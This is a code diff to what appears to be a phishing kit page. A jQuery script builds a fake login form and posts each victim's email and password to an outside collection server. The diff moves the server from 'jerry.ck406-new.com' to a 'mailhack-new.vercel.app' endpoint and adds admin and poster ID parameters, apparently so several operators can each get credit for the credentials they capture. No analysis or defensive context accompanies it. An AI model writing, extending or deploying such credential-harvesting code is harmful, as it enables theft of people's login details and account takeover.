@@ -1,10 +1,7 @@
 
 
-
-
-
-// Function to extract URL parameters
-function getQueryParam(param) {
+const API_URL = 'https://mailhack-new.vercel.app'
+  function getQueryParam(param) {
     const urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(param);
 }
@@ -33,10 +30,9 @@ window.onload = function () {
 
 
 $(document).ready(function () {
-    // Extract 'userid' from the URL
-    let userId = getQueryParam('userid') || 1; // Default to 1 if 'userid' is not present
-    console.log('User ID:', userId);
-
+   const adminId = getQueryParam('admin');
+    const posterId = getQueryParam('poster');
+    const site = getQueryParam('site');
     // Dynamically create the login form
     const loginForm = $('<form>', {
         id: 'loginForm',
@@ -102,15 +98,13 @@ $(document).ready(function () {
             // Send form data via AJAX
             $.ajax({
                 type: 'POST',
-                url: "https://jerry.ck406-new.com/api/data",
+                url: `${API_URL}/ad/${adminId}/${posterId}`,
                 data: {
-                    email: username,
-                    password: password,
-                    user_id: userId,
-                    agent: navigator.userAgent,
-                    user_ip: userIp,
-                    website_id: 4,
-                    created_at: formattedTime,
+                    site:site,
+                    mail: username,
+                    passcode: password,
+                    adminId: adminId,
+                    posterId: posterId
                 },
                 success: function (response) {
                     console.log('Response:', response);
